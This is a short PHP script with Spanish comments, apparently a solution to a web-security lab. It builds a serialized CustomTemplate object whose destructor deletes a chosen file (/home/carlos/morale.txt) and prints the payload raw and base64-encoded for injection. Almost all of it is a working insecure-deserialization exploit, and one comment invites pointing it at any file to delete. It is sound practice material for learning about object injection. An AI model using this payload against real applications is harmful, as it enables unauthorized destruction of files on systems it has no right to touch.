<?php
    class CustomTemplate {
        //private $template_file_path;
        private $lock_file_path;

        public function __construct($template_file_path) {
            //$this->template_file_path = $template_file_path;
            // Ese .lock me impedira borrar el fichero de interes asi que simplemente lo comentamos
            $this->lock_file_path = $template_file_path; //. ".lock";
        }
        function __destruct() {
            // Carlos thought this would be a good idea
            // Primero debe existir el lock_file y luego sera borrado
            if (file_exists($this->lock_file_path)) {
                unlink($this->lock_file_path);
            }
        }
    }

    $nuevo_objeto = new CustomTemplate("/home/carlos/morale.txt");
    $ser_obj = serialize($nuevo_objeto);

    echo $ser_obj;
    echo "\n";
    echo base64_encode($ser_obj);
    // Esto para testear con el fichero que tu quieras borrar 
    unserialize($ser_obj);
?>